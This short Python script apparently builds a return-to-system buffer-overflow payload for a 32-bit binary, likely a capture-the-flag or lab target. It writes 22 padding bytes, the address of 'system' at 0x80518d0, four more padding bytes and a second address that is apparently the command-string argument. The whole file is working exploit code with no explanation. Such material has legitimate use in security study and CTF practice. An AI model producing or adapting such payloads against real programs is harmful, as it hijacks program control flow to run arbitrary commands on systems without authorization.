from struct import pack
import sys


# Jump to system function at 0x80518d0
def main():
	sys.stdout.buffer.write(('\x22' * 22).encode('utf-8') + pack("<I", 0x80518d0) + ('\x22' * 4).encode('utf-8') + pack("<I", 0x080b6871))


if __name__ == "__main__":
	main()